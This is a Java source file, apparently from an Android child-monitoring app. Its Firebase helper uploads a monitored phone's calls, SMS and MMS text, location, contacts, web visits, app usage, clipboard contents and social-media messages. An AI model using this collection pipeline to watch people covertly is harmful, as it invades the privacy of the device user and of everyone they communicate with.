package com.childmonitorai.database;
import com.childmonitorai.models.CallData;
import com.childmonitorai.models.ClipboardData;
import com.childmonitorai.models.ContactData;
import com.childmonitorai.models.MessageData;
import com.childmonitorai.models.MMSData;
import com.childmonitorai.models.SMSData;
import com.childmonitorai.models.WebVisitData;
import com.childmonitorai.models.AppUsageData;
import com.childmonitorai.models.SessionData;



import static android.content.ContentValues.TAG;
import android.util.Log;

import com.google.android.gms.tasks.Tasks;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.android.gms.tasks.Task;
import java.util.Date;
import java.util.Locale;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

public class DatabaseHelper {

    private static DatabaseReference database;

    public DatabaseHelper() {
        // Firebase initialization
        database = FirebaseDatabase.getInstance().getReference("users");
    }

    // Helper method to avoid repetition of paths
    static DatabaseReference getPhoneDataReference(String userId, String phoneModel, String dataType, String uniqueId, String date) {
        return database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child(dataType)
                .child(date)
                .child(uniqueId);
    }

    // Upload all call data grouped by date and check for duplication of recent data only
    public void uploadCallDataByDate(String userId, String phoneModel, CallData callData, String uniqueCallId, String callDate) {
        DatabaseReference callRef = getPhoneDataReference(userId, phoneModel, "calls", uniqueCallId, callDate);

        callRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> callMap = new HashMap<>();
                callMap.put("date", callData.getDate());
                callMap.put("duration", callData.getCallDuration());
                callMap.put("number", callData.getPhoneNumber());
                callMap.put("type", callData.getCallType());
                callMap.put("timestamp", callData.getTimestamp());
                callMap.put("contactName", callData.getContactName()); // Include contact name

                callRef.setValue(callMap).addOnSuccessListener(aVoid -> 
                                Log.d("DatabaseHelper", "Call data uploaded successfully."))
                        .addOnFailureListener(e -> 
                                Log.e("DatabaseHelper", "Failed to upload call data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate call data found for recent call, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload all SMS data grouped by date and check for duplication of recent SMS only
    public void uploadSMSDataByDate(String userId, String phoneModel, SMSData smsData, String uniqueSMSId, String smsDate) {
        DatabaseReference smsRef = getPhoneDataReference(userId, phoneModel, "sms", uniqueSMSId, smsDate);

        smsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> smsMap = new HashMap<>();
                smsMap.put("type", smsData.getType());
                smsMap.put("address", smsData.getAddress());
                smsMap.put("body", smsData.getBody());
                smsMap.put("timestamp", smsData.getTimestamp());
                smsMap.put("date", smsData.getDate());
                smsMap.put("contactName", smsData.getContactName()); 

                smsRef.setValue(smsMap).addOnSuccessListener(aVoid -> 
                                Log.d("DatabaseHelper", "SMS data uploaded successfully."))
                        .addOnFailureListener(e -> 
                                Log.e("DatabaseHelper", "Failed to upload SMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate SMS data found for recent SMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload MMS data grouped by date
    public void uploadMMSDataByDate(String userId, String phoneModel, MMSData mmsData, String uniqueMMSId, String mmsDate) {
        DatabaseReference mmsRef = getPhoneDataReference(userId, phoneModel, "mms", uniqueMMSId, mmsDate);

        mmsRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> mmsMap = new HashMap<>();
                mmsMap.put("subject", mmsData.getSubject());
                mmsMap.put("date", mmsData.getDate());
                mmsMap.put("senderAddress", mmsData.getSenderAddress());
                mmsMap.put("content", mmsData.getContent());

                mmsRef.setValue(mmsMap).addOnSuccessListener(aVoid -> 
                                Log.d("DatabaseHelper", "MMS data uploaded successfully."))
                        .addOnFailureListener(e -> 
                                Log.e("DatabaseHelper", "Failed to upload MMS data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate MMS data found for recent MMS, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    // Upload location data by date
    public void uploadLocationDataByDate(String userId, String phoneModel, Map<String, Object> locationData, String uniqueLocationId, String locationDate) {
        String sanitizedLocationId = sanitizePath(uniqueLocationId);
        DatabaseReference locationRef = getPhoneDataReference(userId, phoneModel, "location", sanitizedLocationId, locationDate);

        // Fetch existing data to avoid duplicates
        locationRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                // If no existing data, create the data map and upload
                locationRef.setValue(locationData)
                        .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Location data uploaded successfully."))
                        .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload location data: " + e.getMessage()));
            } else {
                Log.d("DatabaseHelper", "Duplicate location data found for the same date, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error accessing Firebase: " + e.getMessage()));
    }

    // Upload contact data without date node
    public void uploadContactData(String userId, String phoneModel, ContactData contactData, String uniqueContactId) {
        DatabaseReference contactRef = getPhoneDataReference(userId, phoneModel, "contacts", uniqueContactId, "");

        contactRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                DataSnapshot snapshot = task.getResult();
                if (snapshot.exists()) {
                    // Contact exists, check if it's actually changed
                    ContactData existingContact = snapshot.getValue(ContactData.class);
                    if (existingContact != null) {
                        // Only update if the contact details have actually changed
                        if (!existingContact.getPhoneNumber().equals(contactData.getPhoneNumber()) ||
                            !existingContact.getName().equals(contactData.getName())) {
                            
                            // Set the original name before modification
                            contactData.setNameBeforeModification(existingContact.getName());
                            contactData.setLastModifiedTime(System.currentTimeMillis());
                            
                            // Upload the updated contact
                            uploadContactToFirebase(contactRef, contactData);
                        } else {
                            Log.d(TAG, "Contact unchanged, skipping upload: " + contactData.getName());
                        }
                    }
                } else {
                    // It's a new contact
                    contactData.setCreationTime(System.currentTimeMillis());
                    uploadContactToFirebase(contactRef, contactData);
                }
            } else {
                Log.e(TAG, "Error checking existing contact: " + task.getException().getMessage());
            }
        });
    }

    private void uploadContactToFirebase(DatabaseReference contactRef, ContactData contactData) {
        contactRef.setValue(contactData)
                .addOnSuccessListener(aVoid -> Log.d(TAG, "Contact uploaded successfully: " + contactData.getName()))
                .addOnFailureListener(e -> Log.e(TAG, "Failed to upload contact: " + e.getMessage()));
    }

    public Task<Void> uploadAppData(String userId, String phoneModel, String uniqueKey, Map<String, Object> appMap) {
        DatabaseReference appRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("apps")
                .child(uniqueKey);

        return appRef.get().continueWithTask(task -> {
            if (task.isSuccessful()) {
                DataSnapshot snapshot = task.getResult();
                if (snapshot.exists()) {
                    Map<String, Object> existingData = (Map<String, Object>) snapshot.getValue();
                    if (existingData != null) {
                        String existingStatus = (String) existingData.get("status");
                        String newStatus = (String) appMap.get("status");
                        String existingVersion = (String) existingData.get("version");
                        String newVersion = (String) appMap.get("version");

                        if (existingStatus != null && newStatus != null && 
                            existingVersion != null && newVersion != null) {
                            
                            if (existingStatus.equals(newStatus) && existingVersion.equals(newVersion)) {
                                return Tasks.forResult(null);
                            }
                        }
                        
                        appMap.put("lastUpdated", System.currentTimeMillis());
                        if (existingData.containsKey("firstInstalled")) {
                            appMap.put("firstInstalled", existingData.get("firstInstalled"));
                        } else {
                            appMap.put("firstInstalled", System.currentTimeMillis());
                        }
                    } else {
                        appMap.put("firstInstalled", System.currentTimeMillis());
                        appMap.put("lastUpdated", System.currentTimeMillis());
                    }
                } else {
                    appMap.put("firstInstalled", System.currentTimeMillis());
                    appMap.put("lastUpdated", System.currentTimeMillis());
                }
                
                return appRef.setValue(appMap);
            } else {
                return Tasks.forException(task.getException());
            }
        });
    }

    public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
        DatabaseReference dbRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("web_visits")
                .child(visitData.getDate());

        if (visitData.getDatabaseKey() == null) {
            String key = dbRef.push().getKey();
            visitData.setDatabaseKey(key);
            return dbRef.child(key).setValue(visitData);
        } else {
            return dbRef.child(visitData.getDatabaseKey()).setValue(visitData);
        }
    }

    public void uploadAppUsageDataByDate(String userId, String phoneModel, AppUsageData appUsageData) {
        if (appUsageData.getUsageDuration() == 0 && appUsageData.getLaunchCount() == 0) {
            Log.d(TAG, "Skipping upload for " + appUsageData.getPackageName() + " - no usage data");
            return;
        }

        String sanitizedPackageName = sanitizePath(appUsageData.getPackageName());
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());

        Log.d(TAG, "Attempting to upload usage data for " + appUsageData.getPackageName());

        DatabaseReference usageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("app_usage")
                .child(date)
                .child(sanitizedPackageName);

        Map<String, Object> usageMap = new HashMap<>();
        usageMap.put("package_name", appUsageData.getPackageName());
        usageMap.put("app_name", appUsageData.getAppName());
        usageMap.put("usage_duration", appUsageData.getUsageDuration());
        usageMap.put("launch_count", appUsageData.getLaunchCount());
        usageMap.put("last_used", appUsageData.getLastTimeUsed());
        usageMap.put("first_time_used", appUsageData.getFirstTimeUsed());
        usageMap.put("total_foreground_time", appUsageData.getTotalForegroundTime());
        usageMap.put("day_launch_count", appUsageData.getDayLaunchCount());
        usageMap.put("day_usage_time", appUsageData.getDayUsageTime());
        usageMap.put("is_system_app", appUsageData.isSystemApp());
        usageMap.put("category", appUsageData.getCategory());
        usageMap.put("last_update_time", System.currentTimeMillis());
        usageMap.put("timestamp", appUsageData.getTimestamp());

        // First check if there's existing data for today
        usageRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Map<String, Object> existingData = (Map<String, Object>) task.getResult().getValue();
                if (existingData != null) {
                    // Accumulate usage data
                    long existingDuration = (long) existingData.get("usage_duration");
                    long existingLaunches = (long) existingData.get("launch_count");
                    usageMap.put("usage_duration", existingDuration + appUsageData.getUsageDuration());
                    usageMap.put("launch_count", existingLaunches + appUsageData.getLaunchCount());
                    Log.d(TAG, "Updating existing usage data for " + appUsageData.getPackageName());
                } else {
                    Log.d(TAG, "Creating new usage data entry for " + appUsageData.getPackageName());
                }
                
                // Upload updated data with completion listener
                usageRef.setValue(usageMap)
                        .addOnSuccessListener(aVoid -> {
                            Log.d(TAG, "Successfully uploaded usage data for " + appUsageData.getPackageName());
                        })
                        .addOnFailureListener(e -> {
                            Log.e(TAG, "Failed to upload usage data for " + appUsageData.getPackageName() + ": " + e.getMessage());
                        });
            } else {
                Log.e(TAG, "Failed to query existing data: " + task.getException().getMessage());
            }
        });
    }

    public static void uploadClipboardDataByDate(String userId, String phoneModel, ClipboardData clipboardData) {
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users")
                .child(userId)
                .child("phones")
                .child(phoneModel)
                .child("clipboard")
                .child(date);

        String key = ref.push().getKey();
        if (key != null) {
            // Create a map for the clipboard data to be uploaded
            Map<String, Object> clipboardMap = new HashMap<>();
            clipboardMap.put("content", clipboardData.getContent());
            clipboardMap.put("timestamp", clipboardData.getTimestamp());

            // Upload the clipboard data to Firebase
            ref.child(key).setValue(clipboardMap)
                    .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Clipboard data uploaded successfully."))
                    .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload clipboard data: " + e.getMessage()));
        } else {
            Log.e("DatabaseHelper", "Failed to generate database key");
        }
    }

    // Upload Social Media messages with date node 
    public void uploadSocialMessageData(String userId, String phoneModel, MessageData messageData, String uniqueMessageId, String messageDate, String platform) {
        DatabaseReference messageRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("social_media_messages")
                .child(messageDate) 
                .child(platform) 
                .child(uniqueMessageId); 

        messageRef.get().addOnCompleteListener(task -> {
            if (task.isSuccessful() && !task.getResult().exists()) {
                Map<String, Object> messageMap = new HashMap<>();
                messageMap.put("sender", messageData.getSender());
                messageMap.put("receiver", messageData.getReceiver());
                messageMap.put("message", messageData.getMessage());
                messageMap.put("timestamp", messageData.getTimestamp());
                messageMap.put("direction", messageData.getDirection());
                messageMap.put("platform", platform);

                // Set the value under the social_media_messages node
                messageRef.setValue(messageMap).addOnSuccessListener(aVoid -> {
                            Log.d("DatabaseHelper", platform + " message data uploaded successfully.");
                        })
                        .addOnFailureListener(e -> {
                            Log.e("DatabaseHelper", "Failed to upload " + platform + " message data: " + e.getMessage());
                        });
            } else {
                Log.d("DatabaseHelper", "Duplicate " + platform + " message data found, skipping upload.");
            }
        }).addOnFailureListener(e -> Log.e("DatabaseHelper", "Error checking for duplication: " + e.getMessage()));
    }

    public void uploadSessionData(String userId, String phoneModel, SessionData sessionData) {
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(sessionData.getStartTime()));
        String sanitizedPackageName = sanitizePath(sessionData.getPackageName());
        
        DatabaseReference sessionRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("app_sessions")
                .child(date)
                .child(sanitizedPackageName)
                .child(sessionData.getSessionId());

        Map<String, Object> sessionMap = new HashMap<>();
        sessionMap.put("package_name", sessionData.getPackageName());
        sessionMap.put("app_name", sessionData.getAppName());
        sessionMap.put("start_time", sessionData.getStartTime());
        sessionMap.put("end_time", sessionData.getEndTime());
        sessionMap.put("duration", sessionData.getDuration());
        sessionMap.put("timed_out", sessionData.isTimedOut());

        sessionRef.setValue(sessionMap)
                .addOnSuccessListener(aVoid -> {
                    Log.d(TAG, "Session data uploaded successfully");
                    // Also update the daily aggregated usage
                    updateDailyUsage(userId, phoneModel, sessionData);
                })
                .addOnFailureListener(e -> 
                    Log.e(TAG, "Failed to upload session data: " + e.getMessage()));
    }

    private void updateDailyUsage(String userId, String phoneModel, SessionData sessionData) {
        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date(sessionData.getStartTime()));
        String sanitizedPackageName = sanitizePath(sessionData.getPackageName());
        
        DatabaseReference dailyRef = database.child(userId)
                .child("phones")
                .child(phoneModel)
                .child("app_usage")
                .child(date)
                .child(sanitizedPackageName);

        dailyRef.runTransaction(new com.google.firebase.database.Transaction.Handler() {
            @Override
            public com.google.firebase.database.Transaction.Result doTransaction(com.google.firebase.database.MutableData mutableData) {
                Map<String, Object> current = (Map<String, Object>) mutableData.getValue(Object.class);
                if (current == null) {
                    current = new HashMap<>();
                    current.put("package_name", sessionData.getPackageName());
                    current.put("app_name", sessionData.getAppName());
                    current.put("total_duration", sessionData.getDuration());
                    current.put("session_count", 1L);
                    current.put("last_used", sessionData.getEndTime());
                } else {
                    long totalDuration = current.get("total_duration") instanceof Long ? 
                        (Long) current.get("total_duration") : 0L;
                    long sessionCount = current.get("session_count") instanceof Long ? 
                        (Long) current.get("session_count") : 0L;
                    
                    current.put("total_duration", totalDuration + sessionData.getDuration());
                    current.put("session_count", sessionCount + 1);
                    
                    long lastUsed = current.get("last_used") instanceof Long ? 
                        (Long) current.get("last_used") : 0L;
                    current.put("last_used", Math.max(lastUsed, sessionData.getEndTime()));
                }
                mutableData.setValue(current);
                return com.google.firebase.database.Transaction.success(mutableData);
            }

            @Override
            public void onComplete(com.google.firebase.database.DatabaseError error, 
                                 boolean committed, 
                                 com.google.firebase.database.DataSnapshot currentData) {
                if (error != null) {
                    Log.e(TAG, "Error updating daily usage: " + error.getMessage());
                } else {
                    Log.d(TAG, "Daily usage updated successfully");
                }
            }
        });
    }

    // Helper function to sanitize paths and remove invalid characters
    String sanitizePath(String originalPath) {
        if (originalPath == null) return "";
        
        // Replace any character that's not alphanumeric, underscore, or hyphen
        String sanitized = originalPath.replaceAll("[^a-zA-Z0-9_-]", "_");
        
        // Ensure the path doesn't start with a number 
        if (sanitized.matches("^[0-9].*")) {
            sanitized = "_" + sanitized;
        }
        
        // Prevent empty strings
        if (sanitized.isEmpty()) {
            sanitized = "_empty_";
        }
        
        return sanitized;
    }
}
